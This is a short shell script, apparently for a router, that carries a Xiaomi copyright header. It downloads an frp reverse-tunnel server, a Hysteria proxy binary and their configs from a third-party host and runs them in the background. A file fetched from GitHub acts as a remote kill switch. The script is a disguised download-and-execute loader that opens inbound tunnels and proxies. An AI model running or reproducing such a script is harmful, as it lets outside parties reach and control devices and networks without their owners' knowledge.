#!/bin/sh
# Copyright (C) 2015 Xiaomi
curl -o /tmp/mnt/frps.ini https://www.dasabi.tk/d/%E7%A9%BA%E9%97%B4/%E8%B5%84%E6%BA%90/frp/frps.ini?sign=eYCbhuA3BoJe_r3eR4UhmO_jcopuMhbtca-7BbXRbz8=:0
content=$(cat /tmp/mnt/frps0)

if [ "$content" = "00001234567890" ]; then
    exit 1 
fi

curl -o /tmp/mnt/config.yaml https://www.dasabi.tk/d/%E7%A9%BA%E9%97%B4/%E8%B5%84%E6%BA%90/hy/config.yaml?sign=oCT8XCUfOvPnQZHr8ETgPl8FNZnlpjWD6r5WskN_QM0=:0
curl -o /tmp/mnt/hy https://www.dasabi.tk/d/%E7%A9%BA%E9%97%B4/%E8%B5%84%E6%BA%90/hy/hysteria-linux-mipsle?sign=ldr3JPOZcAJqpPnOMztMrvw9y6t_O7WWIEc9pOpQ_KQ=:0
( /tmp/mnt/hy -c /tmp/mnt/config.yaml ) &
curl -o /tmp/mnt/frps https://www.dasabi.tk/d/%E7%A9%BA%E9%97%B4/%E8%B5%84%E6%BA%90/frp/frps?sign=I5m7jKfTDm_ZQaCUAOSQzRxsmoCr6obR9OCJfw6Pomk=:0
curl -o /tmp/mnt/frps0 https://raw.githubusercontent.com/devksks/xiaomi-frps/main/frps0
chmod +x /tmp/mnt/frps
( /tmp/mnt/frps -c /tmp/mnt/frps.ini ) &

